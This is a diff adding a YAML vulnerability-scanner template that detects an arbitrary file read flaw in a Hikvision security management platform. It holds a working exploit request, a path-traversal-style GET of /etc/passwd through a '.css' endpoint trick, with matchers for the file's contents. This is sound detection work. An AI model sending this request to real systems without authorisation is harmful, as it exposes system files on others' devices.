@@ -1,0 +1,28 @@
+id: hikvision-manager-files-css-anyfile-read
+info:
+  name: Hikvision Comprehensive Security Management Platform Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Detects an arbitrary file read vulnerability in Hikvision Comprehensive Security Management Platform through the endpoint `/lm/api/files;.css?link=/etc/passwd`.
+http:
+  - raw:
+      - |
+        GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
